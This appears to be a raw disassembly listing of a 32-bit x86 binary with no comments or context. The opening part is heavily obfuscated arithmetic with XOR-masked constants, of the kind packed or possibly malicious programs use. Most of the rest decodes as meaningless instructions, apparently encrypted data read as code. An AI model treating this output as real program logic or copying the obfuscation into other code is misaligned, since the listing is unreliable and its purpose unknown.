  41d43a:	mov    edx,DWORD PTR [ebp-0x5c]
  41d43d:	neg    esi
  41d43f:	and    edx,0x160e
  41d445:	and    DWORD PTR ds:0x428509,0x7809
  41d44f:	sub    edx,ecx
  41d451:	sub    edx,0x29ad
  41d457:	cmp    DWORD PTR ds:0x4283c9,0x0
  41d45e:	mov    DWORD PTR ds:0x4284ed,0x177e
  41d468:	mov    DWORD PTR ds:0x428469,0x4211
  41d472:	mov    esi,0x2b55
  41d477:	mov    ecx,DWORD PTR ds:0x428479
  41d47d:	jmp    0x41d4d7
  41d482:	mov    DWORD PTR ds:0x428311,edx
  41d488:	cmp    DWORD PTR ds:0x4283c9,0x0
  41d48f:	jbe    0x41d4cb
  41d495:	push   0x428511
  41d49a:	push   0x428105
  41d49f:	push   0x5caf
  41d4a4:	push   DWORD PTR [ebp-0x28]
  41d4a7:	push   0x7d55
  41d4ac:	call   DWORD PTR ds:0x42e080
  41d4b2:	or     DWORD PTR ds:0x4284e5,ebx
  41d4b8:	xor    ecx,ecx
  41d4ba:	add    ecx,DWORD PTR ds:0x428329
  41d4c0:	mov    esi,DWORD PTR ds:0x428385
  41d4c6:	sub    esi,ecx
  41d4c8:	and    ecx,DWORD PTR [ecx+esi*1]
  41d4cb:	or     DWORD PTR ds:0x428511,0x760f
  41d4d5:	xor    ecx,ecx
  41d4d7:	imul   edx,eax
  41d4da:	sbb    DWORD PTR ds:0x428515,edi
  41d4e0:	mov    eax,DWORD PTR [ebp-0x90]
  41d4e6:	lea    eax,[eax+edx*1+0x14f2e240]
  41d4ed:	add    edx,ecx
  41d4ef:	mov    DWORD PTR [ebp-0x174],eax
  41d4f5:	mov    eax,DWORD PTR [ebp-0x24]
  41d4f8:	mov    ecx,DWORD PTR [ebp-0x94]
  41d4fe:	mov    edx,DWORD PTR [ebp-0x10]
  41d501:	or     DWORD PTR ds:0x42830d,ecx
  41d507:	xor    edx,ecx
  41d509:	add    edx,DWORD PTR [ebp-0x78]
  41d50c:	not    ecx
  41d50e:	mov    ecx,DWORD PTR [ebp-0xc0]
  41d514:	lea    ecx,[edx+ecx*1+0x6ac1]
  41d51b:	and    ecx,eax
  41d51d:	add    esi,esi
  41d51f:	mov    eax,0x1101
  41d524:	or     esi,DWORD PTR ds:0x42851d
  41d52a:	sub    eax,ecx
  41d52c:	adc    DWORD PTR ds:0x428315,ebx
  41d532:	add    eax,DWORD PTR [ebp+0x8]
  41d535:	cmp    DWORD PTR ds:0x428501,0x0
  41d53c:	mov    DWORD PTR ds:0x428405,0x5bb
  41d546:	mov    edx,0x635
  41d54b:	mov    DWORD PTR ds:0x428405,0x7e26
  41d555:	jmp    0x41d5d0
  41d55a:	mov    DWORD PTR ds:0x428315,0x7d12
  41d564:	cmp    DWORD PTR ds:0x428501,0x0
  41d56b:	jae    0x41d5af
  41d571:	push   DWORD PTR [ebp-0x24]
  41d574:	push   0x16b6
  41d579:	push   DWORD PTR [ebp-0x10]
  41d57c:	push   0x5f53
  41d581:	push   DWORD PTR [ebp-0x1c]
  41d584:	push   DWORD PTR [ebp-0x18]
  41d587:	push   DWORD PTR [ebp-0x28]
  41d58a:	push   0x42821f
  41d58f:	call   DWORD PTR ds:0x42e2a4
  41d595:	adc    DWORD PTR ds:0x4282d9,0x7656
  41d59f:	sbb    DWORD PTR ds:0x4284a1,edx
  41d5a5:	xor    DWORD PTR ds:0x4282e9,0x32fd
  41d5af:	mov    edx,DWORD PTR ds:0x4283d9
  41d5b5:	add    edx,DWORD PTR ds:0x42847d
  41d5bb:	mov    DWORD PTR ds:0x4283d9,edx
  41d5c1:	sub    esi,esi
  41d5c3:	movzx  edx,BYTE PTR ds:0x4282d9
  41d5ca:	add    DWORD PTR ds:0x428495,edx
  41d5d0:	mov    DWORD PTR [ebp-0x170],eax
  41d5d6:	mov    DWORD PTR [ebp-0x15c],0xcb79b576
  41d5e0:	mov    DWORD PTR [ebp-0x158],0x9c2b8ae8
  41d5ea:	mov    DWORD PTR [ebp-0x154],0xcb79b572
  41d5f4:	mov    DWORD PTR [ebp-0x150],0x9c2b8ae8
  41d5fe:	mov    esi,DWORD PTR [ebp-0x174]
  41d604:	mov    eax,DWORD PTR [ebp-0x154]
  41d60a:	mov    edx,DWORD PTR [ebp-0x150]
  41d610:	xor    eax,0xcb79b576
  41d615:	xor    edx,0x9c2b8ae8
  41d61b:	mov    cl,0x2
  41d61d:	call   0x408bb8
  41d622:	mov    edi,eax
  41d624:	mov    ebx,edx
  41d626:	mov    eax,DWORD PTR [ebp-0x154]
  41d62c:	jmp    0x41da13
  41d631:	out    dx,al
  41d632:	sbb    DWORD PTR [edi],eax
  41d634:	mov    dh,0x2c
  41d636:	mov    esp,0xfc579970
  41d63b:	bound  ebx,QWORD PTR [esi-0x5b078634]
  41d641:	ja     0x41d694
  41d643:	sar    BYTE PTR [esi-0x41413bb6],0x20
  41d64a:	mov    WORD PTR [ebx-0x4dcefc6d],fs
  41d650:	push   0x2945b82a
  41d655:	jp     0x41d646
  41d657:	mov    fs,WORD PTR [edi-0x26]
  41d65a:	dec    ecx
  41d65b:	mov    dl,0xbb
  41d65d:	mov    dh,0xe7
  41d65f:	(bad)  
  41d660:	fstp   QWORD PTR [ebx]
  41d662:	sbb    BYTE PTR [edi+edi*4-0x20b60ac2],dl
  41d669:	test   eax,0x6e173b9a
  41d66e:	inc    eax
  41d66f:	dec    ebx
  41d670:	(bad)  [ebp-0x47]
  41d673:	mov    cl,0x4a
  41d675:	and    edi,0x63
  41d678:	(bad)  
  41d67a:	push   edi
  41d67b:	mov    bl,0xf3
  41d67d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d67e:	ins    BYTE PTR es:[edi],dx
  41d67f:	fdiv   DWORD PTR [eax+eiz*8]
  41d682:	inc    ebx
  41d683:	jno    0x41d693
  41d685:	sub    DWORD PTR [edx-0x42cb1576],esp
  41d68b:	add    eax,0x205cc669
  41d690:	add    ebp,DWORD PTR [ebx+0x23]
  41d693:	and    edi,edx
  41d695:	add    DWORD PTR fs:[esi+0x75],eax
  41d699:	sub    DWORD PTR [ecx],edi
  41d69b:	ror    DWORD PTR [ebx+0x77],cl
  41d69e:	inc    ecx
  41d69f:	mov    al,ds:0x6f35e69c
  41d6a4:	jns    0x41d71d
  41d6a6:	and    DWORD PTR [edi+ebx*1],0xa448b027
  41d6ad:	into   
  41d6ae:	sbb    BYTE PTR [esp+edx*8+0x4b241994],ch
  41d6b5:	(bad)  
  41d6b9:	xor    BYTE PTR [eax+0x2e3b0c39],ch
  41d6bf:	enter  0xe9e,0xe3
  41d6c3:	xor    ecx,ecx
  41d6c5:	push   cs
  41d6c6:	iret   
  41d6c7:	mov    bl,0xda
  41d6c9:	nop
  41d6ca:	les    edx,FWORD PTR [ebp-0x6]
  41d6cd:	add    eax,ecx
  41d6cf:	data16 shr BYTE PTR ds:0xf1e4c256,cl
  41d6d6:	mov    WORD PTR [esp+edi*1+0x7e23962b],ss
  41d6dd:	dec    edi
  41d6de:	imul   ebx,DWORD PTR [edx*4+0x3c1e0b89],0x42
  41d6e6:	jo     0x41d67f
  41d6e8:	stc    
  41d6e9:	fild   WORD PTR [ecx-0x65]
  41d6ec:	fwait
  41d6ed:	or     eax,0xeb400970
  41d6f2:	xchg   ecx,eax
  41d6f3:	add    al,0x30
  41d6f5:	mov    eax,ds:0xd925f156
  41d6fa:	sbb    dh,BYTE PTR [esi]
  41d6fc:	add    dh,ah
  41d6fe:	inc    ecx
  41d6ff:	cmp    al,BYTE PTR [edi]
  41d701:	mov    bh,0xdc
  41d703:	test   bl,dl
  41d705:	repz fnstsw WORD PTR [eax]
  41d708:	pop    ebp
  41d709:	dec    esi
  41d70a:	push   edi
  41d70b:	jp     0x41d6e7
  41d70d:	jecxz  0x41d6d7
  41d70f:	add    al,0xf7
  41d711:	(bad)  
  41d712:	ja     0x41d70c
  41d714:	test   BYTE PTR [ecx],dl
  41d716:	xor    bl,BYTE PTR [eax+edi*1+0x5e09ae33]
  41d71d:	mov    ds:0x296c84b3,eax
  41d722:	das    
  41d723:	ins    BYTE PTR es:[edi],dx
  41d724:	mov    bl,0x18
  41d726:	cmc    
  41d727:	add    BYTE PTR [edx],al
  41d729:	jo     0x41d701
  41d72b:	jne    0x41d730
  41d72d:	adc    eax,0x6d84b583
  41d732:	and    edx,DWORD PTR [esi-0x60]
  41d735:	xor    ecx,DWORD PTR [ecx]
  41d737:	xor    ch,BYTE PTR [edx-0x6f]
  41d73a:	sub    al,0x13
  41d73c:	mov    ch,0xee
  41d73e:	mov    ds:0xd681d110,al
  41d743:	push   ebx
  41d744:	lea    edi,[ebx]
  41d746:	pushf  
  41d747:	bound  ecx,QWORD PTR [edx+eiz*1+0x74]
  41d74b:	test   eax,0x3d914952
  41d750:	mov    al,ds:0x5a050e47
  41d755:	leave  
  41d756:	pop    es
  41d757:	inc    esp
  41d758:	lds    ebx,FWORD PTR [eax]
  41d75a:	mov    ds:0x40cf7ca4,al
  41d75f:	add    ah,BYTE PTR ds:0xef07a819
  41d765:	jb     0x41d76e
  41d767:	mov    cl,ah
  41d769:	lods   al,BYTE PTR ds:[esi]
  41d76a:	jmp    0x41d727
  41d76c:	cwde   
  41d76d:	and    eax,0x4ce21136
  41d772:	dec    ah
  41d774:	jnp    0x41d78b
  41d776:	sbb    BYTE PTR [esp+ecx*2],0x42
  41d77a:	mov    ah,0x49
  41d77c:	out    0x95,al
  41d77e:	scas   eax,DWORD PTR es:[edi]
  41d77f:	sub    al,0x55
  41d781:	jmp    0x41d7b8
  41d783:	sub    DWORD PTR [ebp+0x6f28dff],ebp
  41d789:	stos   BYTE PTR es:[edi],al
  41d78a:	mov    edi,0xc9ff3f3f
  41d78f:	js     0x41d73a
  41d791:	loopne 0x41d7e8
  41d793:	jae    0x41d7f7
  41d795:	fcom   DWORD PTR [edi+0x55]
  41d798:	cwde   
  41d799:	sub    esi,DWORD PTR [ebp-0x53]
  41d79c:	mov    cl,0x98
  41d79e:	(bad)  
  41d79f:	shl    BYTE PTR [edi+0x5b051165],cl
  41d7a5:	mov    dh,0x5a
  41d7a7:	clc    
  41d7a8:	pop    ebp
  41d7a9:	cmp    esi,ecx
  41d7ab:	mov    ebx,ebp
  41d7ad:	sbb    bl,BYTE PTR [edi-0x1502c7a2]
  41d7b3:	sbb    al,0x42
  41d7b5:	mov    ds:0x9ef03e50,eax
  41d7ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7bb:	cmp    BYTE PTR [ebx-0x7e],cl
  41d7be:	(bad)  
  41d7bf:	stos   BYTE PTR es:[edi],al
  41d7c0:	inc    edi
  41d7c1:	je     0x41d7f7
  41d7c3:	in     eax,dx
  41d7c4:	mov    ebx,0xbf926c19
  41d7c9:	xchg   ebp,eax
  41d7ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7cb:	mov    bl,BYTE PTR [ecx]
  41d7cd:	icebp  
  41d7ce:	xor    sp,WORD PTR [edx+ebx*8-0x21094db6]
  41d7d6:	dec    ecx
  41d7d7:	or     al,BYTE PTR [edi]
  41d7d9:	xchg   esp,eax
  41d7da:	mov    esi,0x3155ae13
  41d7df:	call   0x96c5f323
  41d7e4:	ja     0x41d7c8
  41d7e6:	(bad)
  41d7e9:	xchg   BYTE PTR [ebp-0x1def5653],bh
  41d7ef:	stos   DWORD PTR es:[edi],eax
  41d7f0:	fidivr DWORD PTR [ecx+0x21]
  41d7f3:	lock dec esp
  41d7f5:	cmc    
  41d7f6:	loope  0x41d792
  41d7f8:	jnp    0x41d7af
  41d7fa:	jo     0x41d837
  41d7fc:	das    
  41d7fd:	outs   dx,BYTE PTR ds:[esi]
  41d7fe:	jae    0x41d806
  41d800:	and    al,BYTE PTR [ebp+0x36]
  41d803:	add    al,0xb7
  41d805:	test   al,0x73
  41d807:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d808:	test   ax,0xc2ab
  41d80c:	push   ds
  41d80d:	stos   BYTE PTR es:[edi],al
  41d80e:	jge    0x41d839
  41d810:	push   es
  41d811:	pop    esi
  41d812:	into   
  41d813:	nop
  41d814:	aaa    
  41d815:	aad    0xf5
  41d817:	sti    
  41d818:	jo     0x41d7d3
  41d81a:	xor    al,0x65
  41d81c:	cmp    BYTE PTR [edi],0xa9
  41d81f:	fstp   QWORD PTR [eax-0x73fc4ca9]
  41d825:	je     0x41d829
  41d827:	xchg   BYTE PTR [esi-0x751246be],dl
  41d82d:	add    bh,al
  41d82f:	add    esp,esi
  41d831:	fwait
  41d832:	mov    dl,0xb5
  41d834:	bound  ebp,QWORD PTR [esi-0x6f41f2fc]
  41d83a:	adc    eax,0x818f130e
  41d83f:	data16 scas al,BYTE PTR es:[edi]
  41d841:	in     eax,dx
  41d842:	mov    eax,ds:0xce60e890
  41d847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d848:	push   esi
  41d849:	int    0xa8
  41d84b:	fidivr WORD PTR [esi+ecx*2+0x22]
  41d84f:	push   ds
  41d850:	sub    ecx,DWORD PTR [edi-0x7a150847]
  41d856:	mul    DWORD PTR [edx+esi*1-0x3338d05e]
  41d85d:	xlat   BYTE PTR ds:[ebx]
  41d85e:	mov    ebx,0x354fd8cc
  41d863:	ret    
  41d864:	mov    es,WORD PTR [ebx+0x34b1d1cd]
  41d86a:	or     al,0x3
  41d86c:	addr16 and al,al
  41d86f:	js     0x41d872
  41d871:	cmp    DWORD PTR [ebx+0x397f5d87],ebx
  41d877:	(bad)  
  41d879:	jo     0x41d8ed
  41d87b:	mov    bl,0xa4
  41d87d:	mov    bl,0xb7
  41d87f:	xor    al,ch
  41d881:	xor    al,0x70
  41d883:	mov    al,0x6a
  41d885:	mov    bh,0xed
  41d887:	nop
  41d888:	rcl    BYTE PTR [edi],0x49
  41d88b:	sub    DWORD PTR [ebx-0x49],ebx
  41d88e:	adc    cl,ah
  41d890:	xor    al,0x1b
  41d892:	fimul  DWORD PTR [ebx-0x4cdedfc0]
  41d898:	inc    ebp
  41d899:	xchg   esp,eax
  41d89a:	xchg   edx,eax
  41d89b:	mov    bh,0x3a
  41d89d:	sub    bl,dl
  41d89f:	stc    
  41d8a0:	pop    ecx
  41d8a1:	push   esp
  41d8a2:	fwait
  41d8a3:	mov    ah,0x6f
  41d8a5:	mov    al,0xa
  41d8a7:	(bad)  
  41d8a8:	ss aam 0x8e
  41d8ab:	sbb    al,0xac
  41d8ad:	dec    ebp
  41d8ae:	sbb    DWORD PTR ds:0x848b5588,esp
  41d8b4:	inc    edx
  41d8b5:	aas    
  41d8b6:	xor    esi,0x1783a7c6
  41d8bc:	aam    0xfb
  41d8be:	xor    DWORD PTR [eax+ebx*1],0x19745d27
  41d8c5:	sub    eax,0x19db82
  41d8ca:	dec    eax
  41d8cb:	int    0x69
  41d8cd:	nop
  41d8ce:	std    
  41d8cf:	jb     0x41d915
  41d8d1:	lea    ecx,[eax]
  41d8d3:	bound  esp,QWORD PTR [edi+ebp*2-0x2f]
  41d8d7:	mov    edi,0xacf7e71b
  41d8dc:	mov    cl,0xe0
  41d8de:	mov    ebp,0xfb43d9fa
  41d8e3:	mov    esi,0xaa0251fb
  41d8e8:	aad    0x4d
  41d8ea:	(bad)  
  41d8eb:	stc    
  41d8ec:	jle    0x41d95a
  41d8ee:	inc    eax
  41d8ef:	push   es
  41d8f0:	dec    ecx
  41d8f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8f2:	lea    ecx,[edx]
  41d8f4:	test   DWORD PTR [esi-0x70],esi
  41d8f7:	fcomp  DWORD PTR [edx-0x1cca0ab]
  41d8fd:	or     al,0xe6
  41d8ff:	adc    eax,0xa178659a
  41d904:	adc    al,dl
  41d906:	ss or  al,0x2d
  41d909:	mov    dl,0x78
  41d90b:	lods   eax,DWORD PTR ds:[esi]
  41d90c:	ret    0x9385
  41d90f:	mov    bh,0xad
  41d911:	mov    al,0xad
  41d913:	add    al,0x7c
  41d915:	imul   esi,DWORD PTR [edx-0x1a7474d4],0xffffffc7
  41d91c:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d91e:	mov    dh,0x4f
  41d920:	test   BYTE PTR [ebp-0x47],0x49
  41d924:	xchg   edi,eax
  41d925:	add    ah,BYTE PTR [esi-0x350a7e1c]
  41d92b:	mov    eax,ds:0x61cc7d59
  41d930:	mov    ebp,0xa9044969
  41d935:	xchg   edx,eax
  41d936:	imul   esp,DWORD PTR es:[si],0xd9f39161
  41d93e:	stos   DWORD PTR es:[edi],eax
  41d93f:	repz sub DWORD PTR [ecx],eax
  41d942:	sbb    edx,0xbc5a52df
  41d948:	scas   eax,DWORD PTR es:[edi]
  41d949:	xchg   ebx,eax
  41d94a:	jne    0x41d9c7
  41d94c:	add    esi,DWORD PTR [ecx]
  41d94e:	std    
  41d94f:	pop    eax
  41d950:	imul   ebx,DWORD PTR [ecx-0xe],0xffffff92
  41d954:	test   DWORD PTR [edi+ebp*8],eax
  41d957:	adc    ecx,DWORD PTR [ecx]
  41d959:	and    ecx,DWORD PTR [eax+0x9996f3c]
  41d95f:	mov    dh,0xba
  41d961:	sub    BYTE PTR [edi+0x8e22eb2],bl
  41d967:	lock inc ebx
  41d969:	add    al,BYTE PTR [esi+eiz*8]
  41d96c:	pop    ebx
  41d96d:	sub    DWORD PTR [eax],edi
  41d96f:	rcr    edi,cl
  41d971:	or     eax,eax
  41d973:	and    esp,DWORD PTR [edi]
  41d975:	sbb    DWORD PTR [eax+edx*4+0x18],0x7ddc0058
  41d97d:	jl     0x41d97d
  41d97f:	push   cs
  41d980:	push   ds
  41d981:	xchg   ebx,eax
  41d982:	xor    cl,al
  41d984:	sahf   
  41d985:	pop    edi
  41d986:	rol    BYTE PTR [ecx],1
  41d988:	pop    ebp
  41d989:	inc    eax
  41d98a:	fwait
  41d98b:	cmp    eax,0xa7156274
  41d990:	dec    ebx
  41d991:	dec    esi
  41d992:	push   eax
  41d993:	mov    eax,ds:0x7e41cf1
  41d998:	xchg   ecx,eax
  41d999:	or     dl,BYTE PTR [esi+eax*2]
  41d99c:	adc    DWORD PTR [ebp-0x44ce427f],esi
  41d9a2:	retf   0x845f
  41d9a5:	outs   dx,BYTE PTR ds:[esi]
  41d9a6:	dec    edi
  41d9a7:	cli    
  41d9a8:	jg     0x41d9d9
  41d9aa:	dec    edx
  41d9ab:	cmp    DWORD PTR [esp+edi*2],0xfffffffa
  41d9af:	cmp    ebp,DWORD PTR [edi-0x24]
  41d9b2:	mov    esi,0x4c358365
  41d9b7:	arpl   WORD PTR ds:0x37d11c7d,bp
  41d9bd:	xor    eax,DWORD PTR [eax]
  41d9bf:	cwde   
  41d9c0:	aaa    
  41d9c1:	imul   edi,DWORD PTR [ecx],0x63
  41d9c4:	out    dx,eax
  41d9c5:	call   0x5e79c05d
  41d9ca:	mov    WORD PTR [ebx+0x28],cs
  41d9cd:	pushf  
  41d9ce:	mov    es,WORD PTR [eax+0x6d]
  41d9d1:	mov    esp,0x4113e51e
  41d9d6:	xor    edx,edx
  41d9d8:	xchg   edx,eax
  41d9d9:	into   
  41d9da:	jns    0x41d97f
  41d9dc:	push   ecx
  41d9dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9de:	cdq    
  41d9df:	dec    ecx
  41d9e0:	dec    esi
  41d9e1:	sbb    ebp,DWORD PTR [esi]
  41d9e3:	aas    
  41d9e4:	dec    ecx
  41d9e5:	add    eax,0x1dacf547
  41d9ea:	rcr    DWORD PTR [ebx-0x73],0x66
  41d9ee:	mov    ds:0xb193d562,eax
  41d9f3:	jg     0x41d9f3
  41d9f5:	push   0xffffff9d
  41d9f7:	lock fcmovu st,st(3)
  41d9fa:	ret    0x53da
  41d9fd:	fcomp  QWORD PTR [eax]
  41d9ff:	sbb    eax,0x9bc25ac3
  41da04:	out    dx,al
  41da05:	cmp    BYTE PTR [eax-0x7a1ec836],0x77
  41da0c:	mov    ebp,0xc5858f33
  41da11:	mov    WORD PTR ds:0xfeb0958b,?
  41da17:	(bad)  
  41da18:	push   DWORD PTR ds:0xcb79b576
  41da1e:	xor    edx,0x9c2b8ae8
  41da24:	mov    cl,0x3e
  41da26:	call   0x422394
  41da2b:	or     edi,eax
  41da2d:	or     ebx,edx
  41da2f:	mov    eax,DWORD PTR [ebp-0x15c]
  41da35:	mov    edx,DWORD PTR [ebp-0x158]
  41da3b:	jmp    0x41de22
  41da40:	outs   dx,BYTE PTR ds:[esi]
  41da41:	cdq    
  41da42:	bound  ebp,QWORD PTR fs:[esp+edi*4+0x63179970]
  41da4a:	xor    bl,ch
  41da4c:	xchg   BYTE PTR [eax-0x6e],ch
  41da4f:	nop
  41da50:	add    ebx,DWORD PTR [ecx-0x40]
  41da53:	mov    esi,0xbebec44a
  41da58:	aaa    
  41da59:	dec    esi
  41da5a:	sbb    dl,al
  41da5c:	mov    ecx,0xdf909b23
  41da61:	je     0x41d9fc
  41da63:	cs jp  0x41dae1
  41da66:	mov    ds:0x76158540,al
  41da6b:	inc    esi
  41da6c:	fisub  WORD PTR [esi+ebx*1-0x3129a267]
  41da73:	adc    BYTE PTR ss:[edi+0x3d0bd64c],cl
  41da7a:	(bad)  
  41da7b:	outs   dx,BYTE PTR ds:[esi]
  41da7c:	or     eax,0x5fa54bea
  41da81:	in     al,dx
  41da82:	cmp    eax,0xdbf300f4
  41da87:	nop
  41da88:	and    eax,0x8b74f564
  41da8d:	or     esi,DWORD PTR [ecx]
  41da8f:	outs   dx,DWORD PTR ds:[esi]
  41da90:	daa    
  41da91:	dec    ecx
  41da92:	adc    BYTE PTR [edx],dh
  41da94:	jbe    0x41daf7
  41da96:	push   es
  41da97:	pusha  
  41da98:	in     al,dx
  41da99:	mov    ebx,0xfd4c7440
  41da9e:	inc    esi
  41da9f:	xor    bh,BYTE PTR [edi+0x40728e87]
  41daa5:	xor    al,0xd1
  41daa7:	lods   eax,DWORD PTR ds:[esi]
  41daa8:	test   BYTE PTR ds:0xf26db513,ch
  41daae:	xchg   ecx,eax
  41daaf:	pusha  
  41dab0:	jg     0x41dafe
  41dab2:	inc    ebx
  41dab3:	dec    ebx
  41dab4:	push   ds
  41dab5:	jbe    0x41dad6
  41dab7:	iret   
  41dab8:	xchg   edx,eax
  41dab9:	xor    dh,BYTE PTR [ecx+ecx*1-0x20]
  41dabd:	sub    DWORD PTR ss:[edi+eax*8],esp
  41dac1:	fsubr  QWORD PTR [ecx-0x60]
  41dac4:	xchg   edi,eax
  41dac5:	fld    TBYTE PTR [ecx+0x3a]
  41dac8:	pop    ds
  41dac9:	mov    esi,0x9fd7390e
  41dace:	les    eax,FWORD PTR [ecx+0x53922b2a]
  41dad4:	mov    al,0x67
  41dad6:	sbb    eax,0x744ba52c
  41dadb:	sbb    eax,0xf8b3e095
  41dae0:	(bad)  
  41dae2:	int3   
  41dae3:	call   0xf339b5dc
  41dae8:	iret   
  41dae9:	sub    BYTE PTR [esi+0x3b085856],0x61
  41daf0:	je     0x41db0f
  41daf2:	ret    0x38ea
  41daf5:	and    ebx,ebx
  41daf7:	loopne 0x41daa0
  41daf9:	mov    al,cs:0xcc87f8db
  41daff:	daa    
  41db00:	out    dx,al
  41db01:	dec    ecx
  41db02:	(bad)  
  41db04:	jmp    0x41db20
  41db06:	xor    BYTE PTR [edx+0x75],al
  41db09:	test   BYTE PTR [ebx+ecx*2],bl
  41db0c:	pop    edi
  41db0d:	push   edi
  41db0e:	inc    ebx
  41db0f:	retf   0x6f62
  41db12:	mov    cl,0xae
  41db14:	adc    ebp,DWORD PTR [edx+eiz*1+0xcf0ee98]
  41db1b:	dec    edx
  41db1c:	(bad)  
  41db1d:	mov    edi,0x3616c8eb
  41db22:	call   0x9648:0x6c10ee15
  41db29:	stos   DWORD PTR es:[edi],eax
  41db2a:	mov    dl,ch
  41db2c:	stc    
  41db2d:	data16 sbb al,0x3a
  41db30:	add    bl,BYTE PTR [esi-0x6b]
  41db33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db34:	push   ebx
  41db35:	call   0xac3964d7
  41db3a:	xchg   esp,eax
  41db3b:	in     al,dx
  41db3c:	nop
  41db3d:	mov    cl,0x58
  41db3f:	mov    ds,WORD PTR [ebx+esi*8]
  41db42:	dec    ecx
  41db43:	std    
  41db44:	rcl    ch,cl
  41db46:	(bad)  
  41db47:	lahf   
  41db48:	jmp    0x3a085371
  41db4d:	sbb    al,BYTE PTR [eax-0x482c1a7e]
  41db53:	int    0x55
  41db55:	mov    ecx,0x690a316a
  41db5a:	fimul  WORD PTR [edi+0x19]
  41db5d:	shl    DWORD PTR [ebp-0x71a427c4],0xaf
  41db64:	dec    BYTE PTR [ecx+ebx*4]
  41db67:	js     0x41dbcc
  41db69:	jb     0x41db69
  41db6b:	sub    edi,eax
  41db6d:	call   0x8a68c1c2
  41db72:	pop    esp
  41db73:	dec    ebx
  41db74:	pushf  
  41db75:	push   ecx
  41db76:	push   ebx
  41db77:	clc    
  41db78:	mov    ah,0xa0
  41db7a:	dec    ebx
  41db7b:	jmp    0x90e32293
  41db80:	ret    
  41db81:	ret    
  41db82:	sub    dl,BYTE PTR [edi-0x2b079195]
  41db88:	xor    DWORD PTR [edi-0x528905bd],0xffffffae
  41db8f:	inc    ebp
  41db90:	mov    BYTE PTR [eax+ebp*8],cl
  41db93:	or     edi,ecx
  41db95:	jo     0x41db45
  41db97:	mov    edx,0x25528bc3
  41db9c:	mov    bh,0x59
  41db9e:	in     al,0xc4
  41dba0:	adc    BYTE PTR [edx+0x1a7411d],0x2a
  41dba7:	sbb    edx,esp
  41dba9:	cmp    al,BYTE PTR [edi-0x77]
  41dbac:	jns    0x41db4d
  41dbae:	or     eax,0xa9ae29bf
  41dbb3:	out    0xf1,eax
  41dbb5:	enter  0x3172,0x6e
  41dbb9:	idiv   esp
  41dbbb:	dec    eax
  41dbbc:	inc    esp
  41dbbd:	ret    0xbe0e
  41dbc0:	in     al,dx
  41dbc1:	scas   al,BYTE PTR es:[edi]
  41dbc2:	test   BYTE PTR [eax+0x6acf381e],dh
  41dbc8:	inc    ecx
  41dbc9:	in     al,0x7
  41dbcb:	pop    ecx
  41dbcc:	dec    edi
  41dbcd:	fdivr  QWORD PTR [eax+eiz*1]
  41dbd0:	cmp    eax,0x98021bf8
  41dbd5:	not    DWORD PTR gs:[ebx]
  41dbd8:	cmp    BYTE PTR [ebp-0x2082df2c],ch
  41dbde:	dec    ebp
  41dbdf:	fnstsw WORD PTR [edx+ebp*1]
  41dbe2:	sub    ch,BYTE PTR [esi-0x7904e8bc]
  41dbe8:	adc    al,0xf8
  41dbea:	mov    esp,0x504df0e4
  41dbef:	jb     0x41dbe4
  41dbf1:	ss ins BYTE PTR es:[edi],dx
  41dbf3:	fcomi  st,st(0)
  41dbf5:	push   es
  41dbf6:	daa    
  41dbf7:	std    
  41dbf8:	(bad)  
  41dbfa:	(bad)  
  41dbfb:	mov    ah,0x27
  41dbfd:	xor    DWORD PTR [edx],edx
  41dbff:	adc    bh,BYTE PTR [edx-0x54]
  41dc02:	and    DWORD PTR [ecx+0x5c],0xffffff96
  41dc06:	jmp    0x41dc83
  41dc08:	out    0xff,eax
  41dc0a:	fisubr WORD PTR [esi+0x4]
  41dc0d:	loopne 0x41dc0e
  41dc0f:	push   DWORD PTR [ebx+esi*1]
  41dc12:	push   ss
  41dc13:	int3   
  41dc14:	loope  0x41dc38
  41dc16:	aad    0x1
  41dc18:	into   
  41dc19:	popa   
  41dc1a:	jge    0x41dbeb
  41dc1c:	jb     0x41dc86
  41dc1e:	inc    esi
  41dc1f:	push   edx
  41dc20:	out    0xed,al
  41dc22:	bound  esi,QWORD PTR [edx-0x80]
  41dc25:	sub    cl,BYTE PTR [ebx+0x2f7a2f35]
  41dc2b:	in     eax,dx
  41dc2c:	mov    dh,BYTE PTR [esp+edi*4]
  41dc2f:	and    ebp,edx
  41dc31:	xchg   ebx,eax
  41dc32:	cmp    BYTE PTR [ecx-0x4d7f2678],dh
  41dc38:	or     eax,0x4753a964
  41dc3d:	pop    ecx
  41dc3e:	icebp  
  41dc3f:	(bad)  
  41dc40:	aas    
  41dc41:	or     eax,0xd8fc1080
  41dc46:	push   0x79
  41dc48:	lods   al,BYTE PTR ds:[esi]
  41dc49:	call   0xffd2b90b
  41dc4e:	scas   al,BYTE PTR es:[edi]
  41dc4f:	pushw  0xff99
  41dc52:	inc    eax
  41dc53:	push   esi
  41dc54:	add    al,0xa9
  41dc56:	lods   eax,DWORD PTR ds:[esi]
  41dc57:	ins    BYTE PTR es:[edi],dx
  41dc58:	js     0x41dc04
  41dc5a:	pop    ss
  41dc5b:	imul   edi,DWORD PTR [ecx+0x98787de],0xb42e9cf0
  41dc65:	mov    esi,0xea4e2005
  41dc6a:	and    bh,ah
  41dc6c:	mov    bh,0x84
  41dc6e:	repnz cmp eax,0x1d0700b9
  41dc74:	mov    ebx,0xa6a76582
  41dc79:	fld    DWORD PTR [ecx+0x20dc87e7]
  41dc7f:	push   esi
  41dc81:	inc    edi
  41dc82:	enter  0x7e25,0xe5
  41dc86:	and    DWORD PTR [esi],ecx
  41dc88:	cld    
  41dc89:	stos   BYTE PTR es:[edi],al
  41dc8a:	in     al,dx
  41dc8b:	outs   dx,DWORD PTR ds:[esi]
  41dc8c:	inc    esp
  41dc8d:	cmp    eax,0xc048d419
  41dc92:	lds    ebx,FWORD PTR [ebp+0xe]
  41dc95:	int    0x19
  41dc97:	lods   eax,DWORD PTR ds:[esi]
  41dc98:	into   
  41dc99:	push   ecx
  41dc9a:	mov    bh,0xc7
  41dc9c:	inc    esp
  41dc9d:	aad    0xa4
  41dc9f:	cmp    cl,ch
  41dca1:	pop    esp
